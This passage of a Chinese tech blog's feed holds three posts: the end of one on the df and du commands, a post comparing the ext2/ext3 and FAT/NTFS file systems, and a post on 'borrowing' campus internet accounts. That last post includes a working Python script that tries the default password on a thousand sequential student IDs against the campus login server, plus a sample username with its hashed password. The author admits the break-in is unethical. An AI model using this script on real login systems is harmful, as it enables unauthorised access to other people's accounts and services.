class=&quot;line&quot;&gt;评估目录所占容量&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-h  以人们容易阅读的 GB MB KB 等格式自行显示&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-s  仅显示总计，不列出每个子目录的占用容量&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-m  以 M 为单位&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;例如：&lt;br&gt;&lt;figure class=&quot;highlight erlang-repl&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ df -h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;文件系统          容量  已用  可用  已用&lt;span class=&quot;comment&quot;&gt;% 挂载点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/dev/sda1        &lt;span class=&quot;number&quot;&gt;29&lt;/span&gt;G  &lt;span class=&quot;number&quot;&gt;4.2&lt;/span&gt;G   &lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;G   &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;% /&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;udev           &lt;span class=&quot;number&quot;&gt;1001&lt;/span&gt;M  &lt;span class=&quot;number&quot;&gt;4.0&lt;/span&gt;K &lt;span class=&quot;number&quot;&gt;1001&lt;/span&gt;M    &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;% /dev&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tmpfs           &lt;span class=&quot;number&quot;&gt;404&lt;/span&gt;M  &lt;span class=&quot;number&quot;&gt;792&lt;/span&gt;K  &lt;span class=&quot;number&quot;&gt;403&lt;/span&gt;M    &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;% /run&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;none            &lt;span class=&quot;number&quot;&gt;5.0&lt;/span&gt;M     &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;5.0&lt;/span&gt;M    &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;% /run/lock&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;none           &lt;span class=&quot;number&quot;&gt;1009&lt;/span&gt;M  &lt;span class=&quot;number&quot;&gt;152&lt;/span&gt;K &lt;span class=&quot;number&quot;&gt;1009&lt;/span&gt;M    &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;% /run/shm&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;none            &lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;M   &lt;span class=&quot;number&quot;&gt;28&lt;/span&gt;K  &lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;M    &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;% /run/user&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ du -sh /home/wuchong/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1.1&lt;/span&gt;G     /home/wuchong/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;主要概括性总结了目录文件的构成，以及与普通文件之间的关系。讲解了硬链接和软链接，以及 &lt;code&gt;df du&lt;/code&gt; 命令。&lt;/p&gt;
&lt;p&gt;Linux 是一个文件王国，一切都以文件的形式存在。了解 Linux 的文件系统，是深入了解操作系 Linux 原理的重要一步。&lt;/p&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://book.douban.com/subject/4889838/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;鸟哥的Linux私房菜.基础学习篇&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;-EOF-&lt;/p&gt;
</content>
    
    <summary type="html">
    
      在 Linux 下，所有的文件与目录都是由根目录（/）开始的。然后再一个一个分支下来，形成一棵繁杂的树。因此我们也称这种目录配置方式为“目录树”。那目录树与文件系统有什么关系，目录树是怎么实现的呢？
    
    </summary>
    
      <category term="Linux/Unix" scheme="http://wuchong.me/categories/Linux-Unix/"/>
    
    
      <category term="Linux基础" scheme="http://wuchong.me/tags/Linux%E5%9F%BA%E7%A1%80/"/>
    
      <category term="文件系统" scheme="http://wuchong.me/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Linux基础：文件系统</title>
    <link href="http://wuchong.me/blog/2014/07/19/linux-file-system/"/>
    <id>http://wuchong.me/blog/2014/07/19/linux-file-system/</id>
    <published>2014-07-18T23:36:37.000Z</published>
    <updated>2016-03-08T12:14:39.000Z</updated>
    
    <content type="html">&lt;p&gt;我们知道不同的操作系统所使用的文件系统是不一样的。举例来说，Windows 98 以前所使用的是文件系统是 FAT，Windows 2000 以后的版本有所谓的 NTFS 文件系统。至于 Linux  的正规文件系统则为 Ext2（Linux second extended file system，Ext2fs）。之后又出现了改进版的 Ext3 和 Ext4 ，总体上变化不大。&lt;/p&gt;
&lt;h2 id=&quot;文件系统的对比&quot;&gt;&lt;a href=&quot;#文件系统的对比&quot; class=&quot;headerlink&quot; title=&quot;文件系统的对比&quot;&gt;&lt;/a&gt;文件系统的对比&lt;/h2&gt;&lt;p&gt;我们经常听说 Windows 需要磁盘碎片整理，而 Linux 却不需要。这是为什么呢？&lt;/p&gt;
&lt;p&gt;我们可以先看看 Ext2 文件系统的数据访问方式，如下图所示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/mw690/81b78497jw1eic3rqwb6mj20qj0dzwfu.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;假设一个文件的属性和权限信息是存放在 3 号的 inode 上，而文件的实际数据是存放在 1、4、6、11 这四个 block 中，那么当操作系统要访问该文件时，就能据此来排列磁盘的阅读顺序，可以扫描一次就将 4 个 block  内容读出来。这种访问方式称为索引式文件系统（indexed allocation）。而且 ext 在每两个文件之间都留有相当巨大的空闲空间。当文件被修改、体积增加时，它们通常有足够的空间来扩展。因此在一定程度上保证了 block 的访问范围不会跨度很大，减小了磁头的移动距离。&lt;/p&gt;
&lt;p&gt;那 Windows 的文件系统是怎样的呢？ 我们以 FAT 为例说明。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/mw690/81b78497jw1eic3rr7syaj20nv0azwf8.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在往 FAT 文件系统中存入一个文件时，系统会尽量存放在靠近磁盘开始的地方。当你存入第二个文件时，它会紧挨着第一个文件。当进行频繁的删除修改后，block 就会分散的特别厉害。FAT 文件系统没有 inode 的存在，所以不能一下子将文件的所有 block 在一开始就读取出来。每个 block 号码都记录在前一个 block 当中，形成一个 block 链。当我们需要读取文件的时候，就必须一个一个地将 block 读出，例如上图的读出顺序为 1、6、3、12 。这就会导致磁头无法在磁盘转一圈就获得所有数据，有时候需要来回转好几圈才能读取到这个文件，导致文件读取性能极差。这就是 Windows 经常需要碎片整理的原因——使离散的数据汇合在一起&lt;/p&gt;
&lt;p&gt;而 NTFS 文件系统虽然智能了一点，在文件周围分配了一些“缓冲”的空间，但经过一段时间的使用后， NTFS 文件系统还是会形成碎片。由于 ext 是索引式文件系统，所以基本上不太需要经常进行磁盘碎片整理。&lt;/p&gt;
&lt;h2 id=&quot;ext2-ext3-文件系统&quot;&gt;&lt;a href=&quot;#ext2-ext3-文件系统&quot; class=&quot;headerlink&quot; title=&quot;ext2/ext3 文件系统&quot;&gt;&lt;/a&gt;ext2/ext3 文件系统&lt;/h2&gt;&lt;p&gt;我们知道文件数据除了文件的实际内容外，通常还包括非常多的属性，例如 Linux 中的文件权限（rwx）和文件属性（拥有者、用户组、时间、大小等）。ext 文件系统将这两部分存放在不同的块，权限和属性存放在 inode 中，至于文件的实际数据则存放在 block 块中。另外还有一个超级块（super block）会记录整个文件系统的整体系统。每个 inode 和 block 都有自己的编号。&lt;/p&gt;
&lt;p&gt;ext 文件系统在格式化的时候基本上是区分为多个块组（block group）的，每个块组都有独立的 inode/block/super block 系统。其整体展示图如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/81b78497jw1eic3rpycyxj20l60b1myh.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;其中各个块的含义如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;super block&lt;/strong&gt;：记录此文件系统的整体系统，包括 inode 和 block 的总量、使用量、剩余量，以及文件系统类型等。&lt;/li&gt;
&lt;li&gt;file system description：文件系统描述说明。描述每个 block group 的开始与结束的 block 号码。&lt;/li&gt;
&lt;li&gt;block bitmap：块对照表。用来快速寻找可用的 block 块。&lt;/li&gt;
&lt;li&gt;inode bitmap：inode对照表。用来快速寻找可用的 inode 块。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;inode table&lt;/strong&gt;：存放 inode 块的地方。它们是文件系统的关键。记录了文件的属性，一个文件占用一个 inode，同时包含多个指针，指向了属于该文件的各个 data block 块&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;data block&lt;/strong&gt;：真正存放数据的地方。文件太大会占用多个 block 。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;本节主要讲述了 ext2/ext3 与其他文件系统的区别，以及不用磁盘碎片整理的原理。然后对 ext 文件系统的体系结构进行了剖析，说明了各个数据块的意义。重点是了解 inode 和 block 在 Linux 中所扮演的不同角色以及重要意义。&lt;/p&gt;
&lt;p&gt;Linux 是一个文件王国，一切都以文件的形式存在。了解Linux的文件系统，是深入了解操作系Linux原理的重要一步。&lt;/p&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://book.douban.com/subject/4889838/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;鸟哥的Linux私房菜.基础学习篇&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;-EOF-&lt;/p&gt;
</content>
    
    <summary type="html">
    
      我们知道不同的操作系统所使用的文件系统是不一样的。举例来说，Windows 98 以前所使用的是文件系统是 FAT，Windows 2000 以后的版本有所谓的 NTFS 文件系统。至于 Linux  的正规文件系统则为 Ext2（Linux second extended file system，Ext2fs）。而我们经常听说的 Windows 需要磁盘碎片整理，却没怎么听说 Linux 需要，这是为什么呢？
    
    </summary>
    
      <category term="Linux/Unix" scheme="http://wuchong.me/categories/Linux-Unix/"/>
    
    
      <category term="Linux基础" scheme="http://wuchong.me/tags/Linux%E5%9F%BA%E7%A1%80/"/>
    
      <category term="文件系统" scheme="http://wuchong.me/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>用Python模拟登录“借”上网帐号</title>
    <link href="http://wuchong.me/blog/2014/07/16/use-python-login-borrow-account/"/>
    <id>http://wuchong.me/blog/2014/07/16/use-python-login-borrow-account/</id>
    <published>2014-07-16T08:22:57.000Z</published>
    <updated>2016-03-08T12:20:05.000Z</updated>
    
    <content type="html">&lt;p&gt;昨天同学让我帮忙下篇论文，发现自己的校内上网帐号有一段时间没充值了。登录校园网才能下论文，无奈问了周围的人却发现都没充值！（实验室可以免费上网大家都不充值了么）&lt;/p&gt;
&lt;p&gt;懒得去充值，就想会不会有的上网帐号还是用的默认密码？如果有的话，岂不是可以“借来”用一下！虽然有些不道德，但是为了验证心里的想法还是忍不住下手了。&lt;/p&gt;
&lt;h2 id=&quot;分析请求&quot;&gt;&lt;a href=&quot;#分析请求&quot; class=&quot;headerlink&quot; title=&quot;分析请求&quot;&gt;&lt;/a&gt;分析请求&lt;/h2&gt;&lt;p&gt;首先当然是分析登录请求啦。我们学校的校园网登录网址为&lt;code&gt;10.0.0.55&lt;/code&gt;。所以用 Chrome 打开登录网页，并打开&lt;code&gt;开发者工具 -&amp;gt; Network&lt;/code&gt;，再输入用户名密码，点击登录。可以捕获到 POST 消息。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/mw690/81b78497jw1eiepcju7vuj20yw0gogoo.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;其中最重要的是两个信息，一个是 Request URL，另一个是 Form Data。前者是提交请求的网址，后者是提交的表单。表单里最重要的是 username 和 password 两个字段。后面的三个字段可以忽略。我们发现，表单中的密码是加密后提交的。会用的什么加密呢？我们去 JS 脚本里找找有什么。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/mw690/81b78497jw1eiepcjd6suj20yq0gswhi.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在源代码的 head 标签内发现了大段的 JS 脚本，其中就有关于登录的。其实就是用了简单的 MD5 加密，并将加密结果截取了第 8 到 24 的字符。连 salt 都没有用到。&lt;/p&gt;
&lt;p&gt;有了上面这些信息后，我们就可以构造请求了。这当然要拿出 Python 大法了。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;模拟登录&quot;&gt;&lt;a href=&quot;#模拟登录&quot; class=&quot;headerlink&quot; title=&quot;模拟登录&quot;&gt;&lt;/a&gt;模拟登录&lt;/h2&gt;&lt;p&gt;用 Python 可以快速实现模拟登录，主要使用了 &lt;code&gt;requests&lt;/code&gt; 库。&lt;/p&gt;
&lt;figure class=&quot;highlight livescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#encoding=utf8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;### 登录页的url&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;url = &lt;span class=&quot;string&quot;&gt;&#39;http://10.0.0.55/cgi-bin/do_login&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;### 有些网站反爬虫，这里用headers把程序伪装成浏览器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;header = &amp;#123; &lt;span class=&quot;string&quot;&gt;&#39;User-Agent&#39;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&#39;Mozilla/5.0 (Windows NT 6.1)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36&#39;&lt;/span&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;### 登录需要提交的表单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;form_data = &amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;username&#39;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&#39;2220130260&#39;&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;#填入网站的上网帐号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;password&#39;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&#39;8ad9902aecba32e2&#39;&lt;/span&gt;,  &lt;span class=&quot;comment&quot;&gt;#填入网站密码（加密后的）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;drop&#39;&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;type&#39;&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;n&#39;&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;s = requests.session()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;response = s.post(url,data = form_data,headers = header)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt; response.text&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最终读取 response 的结果，我们可以判断登录是否成功。例如，上述代码运行的结果是&lt;code&gt;password_error&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;借帐号&quot;&gt;&lt;a href=&quot;#借帐号&quot; class=&quot;headerlink&quot; title=&quot;借帐号&quot;&gt;&lt;/a&gt;借帐号&lt;/h2&gt;&lt;p&gt;有了上面的模拟登录，我们就可以把它写成脚本，遍历成百上千个帐号。其实就是用循环构造每一个表单。&lt;/p&gt;
&lt;p&gt;这里密码我们使用 &lt;code&gt;hashlib&lt;/code&gt; 库来完成 MD5 加密。至于上网帐号，一般都是用学生学号作为上网帐号的，就拿最小的 13 级本科生开刀吧（谁让你们年少无知呢，记得改密码）。像 13 级本科生的学校是 &lt;code&gt;112013&lt;/code&gt; 开头，我们就循环前 1000 个学生。&lt;/p&gt;
&lt;p&gt;直接给出脚本代码吧！&lt;/p&gt;
&lt;figure class=&quot;highlight nimrod&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#encoding=utf8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; hashlib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;###登录页的url&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;url = &#39;http://&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;55&lt;/span&gt;/cgi-bin/do_login&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;###有些网站反爬虫，这里用headers把程序伪装成浏览器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;header = &amp;#123; &#39;&lt;span class=&quot;type&quot;&gt;User&lt;/span&gt;-&lt;span class=&quot;type&quot;&gt;Agent&lt;/span&gt;&#39; : &#39;&lt;span class=&quot;type&quot;&gt;Mozilla&lt;/span&gt;/&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;Windows&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;NT&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;type&quot;&gt;AppleWebKit&lt;/span&gt;/&lt;span class=&quot;number&quot;&gt;537&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;36&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;KHTML&lt;/span&gt;, like &lt;span class=&quot;type&quot;&gt;Gecko&lt;/span&gt;) &lt;span class=&quot;type&quot;&gt;Chrome&lt;/span&gt;/&lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;1599&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;101&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;Safari&lt;/span&gt;/&lt;span class=&quot;number&quot;&gt;537&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;36&lt;/span&gt;&#39; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def md5(str):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    m = hashlib.md5()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    m.update(str)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; m.hexdigest()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def login(form_data):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    s = requests.session()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#发出请请求&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    response = s.post(url,data = form_data,headers = header)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; response.content&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def tryAccount(id_start,id_end,default_pass):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;###登录需要提交的表单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    form_data = &amp;#123;&#39;username&#39;:&#39;&lt;span class=&quot;type&quot;&gt;XXXXXX&lt;/span&gt;&#39;, &lt;span class=&quot;comment&quot;&gt;#填入网站的用户名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &#39;password&#39;:&#39;&lt;span class=&quot;type&quot;&gt;XXXXXX&lt;/span&gt;&#39;,  &lt;span class=&quot;comment&quot;&gt;#填入网站密码（加密后的）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &#39;drop&#39;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &#39;&lt;span class=&quot;keyword&quot;&gt;type&lt;/span&gt;&#39;:&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &#39;n&#39;:&lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    passwd = md5(default_pass)[&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    form_data[&#39;password&#39;] = passwd      &lt;span class=&quot;comment&quot;&gt;#将加密后的密码填入表单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;range&lt;/span&gt;(id_start,id_end):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        form_data[&#39;username&#39;] = str(i)  &lt;span class=&quot;comment&quot;&gt;#将用户名填入表单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;literal&quot;&gt;result&lt;/span&gt; = login(form_data)       &lt;span class=&quot;comment&quot;&gt;#登录，获取返回的 response 结果&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;result&lt;/span&gt; != &#39;password_error&#39; &lt;span class=&quot;keyword&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;result&lt;/span&gt; != &#39;username_error&#39;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            print str(i)+&lt;span class=&quot;string&quot;&gt;&quot;\t&quot;&lt;/span&gt;+&lt;span class=&quot;literal&quot;&gt;result&lt;/span&gt;        &lt;span class=&quot;comment&quot;&gt;#打印账号、密码正确的学号...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print &lt;span class=&quot;string&quot;&gt;&quot;\n上网不涉密，涉密不上网&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; __name__ == &lt;span class=&quot;string&quot;&gt;&quot;__main__&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;ID_START&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;1120130000&lt;/span&gt;   &lt;span class=&quot;comment&quot;&gt;#起始学号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;ID_END&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;1120131000&lt;/span&gt;     &lt;span class=&quot;comment&quot;&gt;#结束学号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;DEFAULT_PASS&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;000000&quot;&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;#初始密码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    tryAccount(&lt;span class=&quot;type&quot;&gt;ID_START&lt;/span&gt;,&lt;span class=&quot;type&quot;&gt;ID_END&lt;/span&gt;,&lt;span class=&quot;type&quot;&gt;DEFAULT_PASS&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;运行脚本后得到如图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/mw690/81b78497jw1eiepciuuumj216g0vy77n.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
